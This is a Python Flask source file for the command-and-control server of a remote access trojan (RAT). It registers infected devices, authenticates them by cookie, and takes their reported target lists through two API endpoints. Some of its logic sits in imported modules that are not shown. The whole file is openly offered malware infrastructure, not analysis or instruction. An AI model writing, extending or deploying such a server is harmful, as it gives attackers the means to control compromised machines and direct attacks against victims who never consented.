"""
Main file for the Command and Control server

This file contains endpoints for both the RAT device and the command client. Classes for the RAT start with "RAT" while 
ones for the client start with "Client"
"""
import os
from flask import Flask
from flask import request
from flask import make_response
from functools import wraps
from flask_restful import Api
from flask_restful import Resource

from dotenv import load_dotenv
load_dotenv()

import rat_api
import database

app = Flask(__name__)
api = Api(app)
db = database.Database()

def rat_authentication(f):
    """ Authentication for the remote device """
    @wraps(f)
    def decorated_function(*args, **kwargs):
        token = request.cookies.get('client_id')
        print('token: ',token , type(token))
        if not db.is_document(token):
            return make_response("Unauthorized", 401)
        return f(*args, **kwargs)
    return decorated_function



class RATRegisterClient(Resource):
    @staticmethod
    def post():
        """ Register a new instance of the RAT machine """
        data, status_code = rat_api.register_client(request.get_json())
        response = make_response(data)
        if status_code == 200:
            response.set_cookie("client_id", data['client_id'])
        response.content_type = "Application/json"
        response.status_code = status_code
        return response




class RATTargetList(Resource):
    @staticmethod
    @rat_authentication
    def post():
        """ Update target list, return if any targets got blacklisted """
        data, status_code = rat_api.update_target_list(
                request.cookies.get("client_id"),
                request.get_json()
            )
        response = make_response(data)
        response.content_type = "Application/json"
        response.status_code = status_code
        return response



api.add_resource(RATRegisterClient, "/api/v0/rat/register")
api.add_resource(RATTargetList, "/api/v0/rat/targetlist")

if __name__ == "__main__":
    app.run(debug=True)

